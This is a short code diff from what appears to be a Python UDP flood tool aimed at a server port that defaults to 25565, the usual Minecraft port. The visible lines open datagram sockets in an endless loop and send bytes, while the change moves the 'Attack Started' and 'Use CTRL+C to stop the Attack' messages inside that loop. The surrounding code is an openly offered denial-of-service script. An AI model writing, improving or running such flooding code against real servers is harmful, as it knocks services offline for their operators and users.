@@ -16,6 +16,10 @@ if port == 0:
       port = 25565
 
 while True:
+   
+   print("Attack Started ☢️")
+
+   print("Use CTRL+C to stop the Attack")
 
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
@@ -26,5 +30,3 @@ while True:
    if i < 10:
 
       s.send(b'\x01')
-print("Attack Started ☢️")
-print("Use CTRL+C to stop the Attack")
